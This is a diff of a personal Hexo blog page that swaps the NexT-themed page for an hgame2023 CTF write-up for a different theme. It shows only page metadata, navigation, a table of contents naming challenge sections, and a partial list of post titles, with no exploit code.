@@ -1,307 +1,730 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"pa1r0t.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","width":320,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":"flase","pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
-
-    <meta name="description" content="复现hgame">
-<meta property="og:type" content="article">
-<meta property="og:title" content="hgame2023">
-<meta property="og:url" content="https://pa1r0t.github.io/2023/01/14/hgame2023/index.html">
+  <meta charset="utf-8">
+  <title>hgame2023 | Pa1r0t</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="hgame2023 | Pa1r0t">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="welcome to my bolg">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="https://pa1r0t.github.io/categories/index.html">
 <meta property="og:site_name" content="Pa1r0t">
-<meta property="og:description" content="复现hgame">
+<meta property="og:description" content="welcome to my bolg">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pa1r0t.github.io/images/xor246.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114103532078.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114103642721.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114104040525.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114110109416.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114151906912.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114152100537.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153844803.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153925669.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153109502.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116195715458.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200235063.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200809156.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200845999.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116201152048.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115211905558.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115212222119.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115214426688.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116111016050.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116111442132.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116111621791.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116112543060.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116113635529.png">
-<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230214103452756.png">
-<meta property="article:published_time" content="2023-01-14T02:09:49.000Z">
-<meta property="article:modified_time" content="2023-02-14T02:36:57.723Z">
+<meta property="article:published_time" content="2022-11-06T05:27:18.000Z">
+<meta property="article:modified_time" content="2022-11-07T03:30:48.209Z">
 <meta property="article:author" content="Pa1r0t_9e">
-<meta name="twitter:card" content="&lt;twitter:card&gt;">
-<meta name="twitter:image" content="https://pa1r0t.github.io/2023/01/14/hgame2023/%3Ctwitter:image%3E">
-<meta name="twitter:creator" content="@&lt;twitter:creator&gt;">
-<meta name="twitter:site" content="<twitter:site>">
-<link rel="publisher" href="%3Cg+:profile_link%3E">
-<meta property="fb:admins" content="&lt;fb:admin_id&gt;">
-<meta property="fb:app_id" content="&lt;fb:app_id&gt;">
+<meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://pa1r0t.github.io/2023/01/14/hgame2023/">
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://pa1r0t.github.io/2023/01/14/hgame2023/","path":"2023/01/14/hgame2023/","title":"hgame2023"}</script>
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>hgame2023 | Pa1r0t</title>
-  
+<script src="/js/iconfont.js?v=1.1.0" ></script>
 
-
-
-
-
-
-  <script async defer data-website-id="" src=""></script>
-
-  <script defer data-domain="" src=""></script>
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="Pa1r0t" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Pa1r0t" type="application/atom+xml">
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Pa1r0t</p>
-      <i class="logo-line"></i>
-    </a>
-      <p class="site-subtitle" itemprop="description">记录成长</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
 </div>
 
 
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/ctf/" rel="section"><i class="fa fa-flag fa-fw"></i>ctf</a></li><li class="menu-item menu-item-re"><a href="/re/" rel="section"><i class="fa fa-brands fa-rev fa-fw"></i>re</a></li><li class="menu-item menu-item-algorithm"><a href="/Algorithm/" rel="section"><i class="fa-solid fa-microchip fa-fw"></i>Algorithm</a></li><li class="menu-item menu-item-friendly-chain"><a href="/links/" rel="section"><i class="fa fa-user-group fa-fw"></i>Friendly chain</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Pa1r0t_9e</span>
 </div>
 
-    </div>
-  </div>
-
-</div>
+<div class="icon">
+    
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week1"><span class="nav-number">1.</span> <span class="nav-text">week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">1.1.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%94%E5%85%94%E7%9A%84%E8%BD%A6%E7%A5%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">兔兔的车票</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E7%94%B5%E8%AF%9D"><span class="nav-number">1.1.2.</span> <span class="nav-text">神秘的电话</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-overflow"><span class="nav-number">1.2.1.</span> <span class="nav-text">easy_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#choose-the-seat"><span class="nav-number">1.2.2.</span> <span class="nav-text">choose_the_seat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ORW"><span class="nav-number">1.2.3.</span> <span class="nav-text">ORW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-shellcode"><span class="nav-number">1.2.4.</span> <span class="nav-text">simple_shellcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week2"><span class="nav-number">2.</span> <span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re"><span class="nav-number">2.1.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#before-main"><span class="nav-number">2.1.1.</span> <span class="nav-text">before_main</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-number">3.</span> <span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re-1"><span class="nav-number">3.1.</span> <span class="nav-text">re</span></a></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Pa1r0t_9e"
-      src="/images/avatar.gif">
-  <p class="site-author-name" itemprop="name">Pa1r0t_9e</p>
-  <div class="site-description" itemprop="description">welcome to my bolg</div>
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
 </div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">32</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="mailto:2817455529@qq.com" title="E-Mail → mailto:2817455529@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-  <div class="cc-license site-overview-item animated" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
-  </div>
 
 
 
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(33)</small>
+            
         </div>
-      </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="ctf">
+            
+            ctf
+            <small>(14)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="re">
+            
+            re
+            <small>(19)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
     </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="33">
 
-
-    </header>
-
-    
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/14/hgame2023/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="hgame2023 | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          hgame2023
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-01-14 10:09:49" itemprop="dateCreated datePublished" datetime="2023-01-14T10:09:49+08:00">2023-01-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-14 10:36:57" itemprop="dateModified" datetime="2023-02-14T10:36:57+08:00">2023-02-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
 </div>
 
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
         </div>
-      </header>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+    </div>
+
+</div>
 
     
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/16/%E6%9C%89%E7%90%86%E6%95%B0%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="有理数四则运算">有理数四则运算</span>
+            <span class="post-date" title="2023-05-16 16:49:16">2023/05/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/11/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BC%98%E5%8C%96/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="双指针优化">双指针优化</span>
+            <span class="post-date" title="2023-05-11 15:21:59">2023/05/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="关于c++中double误差问题">关于c++中double误差问题</span>
+            <span class="post-date" title="2023-05-10 10:46:59">2023/05/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="奇奇怪怪的错误">奇奇怪怪的错误</span>
+            <span class="post-date" title="2023-05-09 10:30:44">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pat乙级第二天记录">pat乙级第二天记录</span>
+            <span class="post-date" title="2023-05-08 13:31:53">2023/05/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="map题解字符串问题">map题解字符串问题</span>
+            <span class="post-date" title="2023-05-07 19:33:37">2023/05/07</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="西湖论剑wp">西湖论剑wp</span>
+            <span class="post-date" title="2023-02-15 10:06:30">2023/02/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="IDA结构体分析">IDA结构体分析</span>
+            <span class="post-date" title="2023-01-21 09:52:17">2023/01/21</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/20/std%E9%80%86%E5%90%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="STL逆向">STL逆向</span>
+            <span class="post-date" title="2023-01-20 20:03:08">2023/01/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/19/Microcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Microcode">Microcode</span>
+            <span class="post-date" title="2023-01-19 22:09:48">2023/01/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/19/IDAPython/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="IDAPython">IDAPython</span>
+            <span class="post-date" title="2023-01-19 17:52:02">2023/01/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/01/14/hgame2023/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="hgame2023">hgame2023</span>
+            <span class="post-date" title="2023-01-14 10:09:49">2023/01/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2023/01/13/pwn-practice1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwn_practice1">pwn_practice1</span>
+            <span class="post-date" title="2023-01-13 11:50:36">2023/01/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="编译2">编译2</span>
+            <span class="post-date" title="2023-01-12 22:07:41">2023/01/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/09/csapp1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="csapp1">csapp1</span>
+            <span class="post-date" title="2023-01-09 14:30:39">2023/01/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="编译篇1">编译篇1</span>
+            <span class="post-date" title="2023-01-09 10:16:11">2023/01/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/05/AST%E6%B7%B7%E6%B7%862/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="AST混淆2">AST混淆2</span>
+            <span class="post-date" title="2023-01-05 17:57:25">2023/01/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/03/AST%E6%B7%B7%E6%B7%861/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="AST混淆1">AST混淆1</span>
+            <span class="post-date" title="2023-01-03 19:32:24">2023/01/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/02/ollvm%E5%81%9A%E6%B3%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ollvm做法">ollvm做法</span>
+            <span class="post-date" title="2023-01-02 22:06:24">2023/01/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="x86暴力调用so">x86暴力调用so</span>
+            <span class="post-date" title="2023-01-02 09:03:22">2023/01/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2023/01/01/unicorn-learning5/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unicorn_learning5">unicorn_learning5</span>
+            <span class="post-date" title="2023-01-01 09:58:42">2023/01/01</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/31/unicorn-learning4/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unicorn_learning4">unicorn_learning4</span>
+            <span class="post-date" title="2022-12-31 14:12:48">2022/12/31</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/31/unicorn-learning3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unicorn_learning3">unicorn_learning3</span>
+            <span class="post-date" title="2022-12-31 09:12:04">2022/12/31</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/30/unicorn-learning2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unicorn_learning2">unicorn_learning2</span>
+            <span class="post-date" title="2022-12-30 09:40:33">2022/12/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/29/unicorn1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unicorn_learning1">unicorn_learning1</span>
+            <span class="post-date" title="2022-12-29 14:32:54">2022/12/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/22/re-base3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="re_base3">re_base3</span>
+            <span class="post-date" title="2022-12-22 19:33:01">2022/12/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/21/re-base2/"
